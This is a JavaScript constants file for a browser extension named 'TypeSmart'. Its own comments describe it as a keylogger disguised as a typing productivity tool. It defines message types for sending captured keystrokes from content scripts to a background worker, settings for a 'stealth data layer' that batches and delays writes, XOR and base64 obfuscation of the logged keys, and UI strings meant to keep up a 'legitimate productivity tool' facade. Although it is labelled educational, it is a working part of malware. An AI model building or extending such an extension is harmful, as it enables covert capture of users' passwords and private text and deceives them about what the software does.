
(function (root, factory) {
  // UMD — works everywhere
  if (typeof module !== "undefined" && module.exports) {
    module.exports = factory();
  } else {
    // Explicitly use window to ensure content script exposure
    var target =
      typeof window !== "undefined"
        ? window
        : typeof self !== "undefined"
          ? self
          : this;
    target.TSConstants = factory();
  }
})(
  typeof window !== "undefined"
    ? window
    : typeof self !== "undefined"
      ? self
      : this,
  function () {
    "use strict";

    // ---------------------------------------------------------------------------
    // Storage
    // ---------------------------------------------------------------------------

    /**
     * Key used in browser.storage.local to persist logged entries.
     * All modules MUST use this key — never hard-code the string elsewhere.
     * @type {string}
     */
    var STORAGE_KEY = "ts_log";

    // ---------------------------------------------------------------------------
    // Message types  (content ↔ background communication)
    // ---------------------------------------------------------------------------

    /**
     * Enum-like object for browser.runtime.sendMessage / onMessage types.
     *
     * LOG_KEYS — content script → background: "here are new keystrokes"
     * EXPORT   — popup/options → background: "give me the full log for download"
     * CLEAR    — popup/options → background: "wipe all stored data"
     * PING     — any → background: "are you alive?" (health-check)
     *
     * @type {Readonly<{LOG_KEYS: string, EXPORT: string, CLEAR: string, PING: string}>}
     */
    var MSG_TYPES = Object.freeze({
      LOG_KEYS: "LOG_KEYS",
      EXPORT: "EXPORT",
      CLEAR: "CLEAR",
      PING: "PING",
    });

    // ---------------------------------------------------------------------------
    // Stealth / batching configuration
    // ---------------------------------------------------------------------------

    /**
     * Tuning knobs for the stealth data layer (data/stealth.js).
     *
     * DELAY_MS       — milliseconds to wait before flushing a batch
     * BATCH_SIZE     — max number of entries held in memory before forced flush
     * MIN_KEY_LENGTH — ignore keystroke buffers shorter than this (noise filter)
     *
     * @type {Readonly<{DELAY_MS: number, BATCH_SIZE: number, MIN_KEY_LENGTH: number}>}
     */
    var STEALTH = Object.freeze({
      DELAY_MS: 3000,
      BATCH_SIZE: 20,
      MIN_KEY_LENGTH: 2,
    });

    // ---------------------------------------------------------------------------
    // UI strings
    // ---------------------------------------------------------------------------

    /**
     * User-facing strings that maintain the "legitimate productivity tool" facade.
     *
     * APP_NAME — displayed in popup header, options page title, etc.
     * TAGLINE  — subtitle shown beneath the app name
     * VERSION  — current extension version string
     *
     * @type {Readonly<{APP_NAME: string, TAGLINE: string, VERSION: string}>}
     */
    var UI = Object.freeze({
      APP_NAME: "TypeSmart",
      TAGLINE: "Boost your typing productivity",
      VERSION: "1.0.0",
    });

    // ---------------------------------------------------------------------------
    // Obfuscation
    // ---------------------------------------------------------------------------

    /**
     * Configuration for the simple XOR-based obfuscation applied to keystroke
     * data before it hits storage.  The KEY is intentionally short — this is
     * educational obfuscation, NOT real encryption.
     *
     * @type {Readonly<{XOR_KEY: number, ENCODING: string}>}
     */
    var OBFUSCATION = Object.freeze({
      XOR_KEY: 0x5a,
      ENCODING: "base64",
    });

    // ---------------------------------------------------------------------------
    // Export surface
    // ---------------------------------------------------------------------------

    return Object.freeze({
      STORAGE_KEY: STORAGE_KEY,
      MSG_TYPES: MSG_TYPES,
      STEALTH: STEALTH,
      UI: UI,
      OBFUSCATION: OBFUSCATION,
    });
  },
);
